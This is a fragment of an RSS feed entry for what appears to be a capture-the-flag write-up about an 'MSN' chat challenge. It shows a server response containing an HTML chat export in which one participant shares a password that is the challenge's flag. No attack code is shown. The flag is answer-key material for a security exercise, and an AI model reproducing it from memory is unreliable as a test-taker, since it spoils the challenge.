+Content-Length: 935 { "data":{ "data":"&lt;!doctype html&gt;\n&lt;html&gt;\n&lt;head&gt;\n &lt;meta charset=\"utf-8\"/&gt;\n &lt;title&gt;MSN Chat Export&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n &lt;h1&gt;Chat Export&lt;/h1&gt;\n &lt;p&gt;&lt;b&gt;session_id&lt;/b&gt;: 00000000-0000-0000-0000-000000000000&lt;/p&gt;\n &lt;p&gt;&lt;b&gt;generated_at&lt;/b&gt;: 2026-03-05T06:21:17.359961+00:00&lt;/p&gt;\n &lt;h3&gt;Meta&lt;/h3&gt;\n &lt;h3&gt;Messages&lt;/h3&gt;\n &lt;table border=\"1\" cellpadding=\"6\" cellspacing=\"0\"&gt;\n &lt;tr&gt;&lt;th&gt;ts&lt;/th&gt;&lt;th&gt;kind&lt;/th&gt;&lt;th&gt;sender_id&lt;/th&gt;&lt;th&gt;body&lt;/th&gt;&lt;/tr&gt;\n &lt;tr&gt;&lt;td&gt;2026-03-02T09:20:38.165596&lt;/td&gt;&lt;td&gt;message&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Hi Chri, I&amp;#x27;ve finished setting up the team&amp;#x27;s infrastructure.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;2026-03-02T09:20:38.165600&lt;/td&gt;&lt;td&gt;message&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;We Lo, thanks! I&amp;#x27;ll take a look at them as soon as I can.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;2026-03-02T09:20:38.165601&lt;/td&gt;&lt;td&gt;message&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Perfect, I&amp;#x27;ll send you the password here. srdnlen{n0st4lg14_1s_4_vuln3r4b1l1ty_t00}&lt;/td&gt;&lt;/tr&gt;\n &lt;/table&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n" }, "ok":true
+} ]]></description><link>writeup.html</link><guid isPermaLink="false">srdnlenCTF/MSN/Writeup.md</guid><pubDate>Thu, 05 Mar 2026 11:28:05 GMT</pubDate><enclosure url="images/msn_sol_login.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;images/msn_sol_login.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>
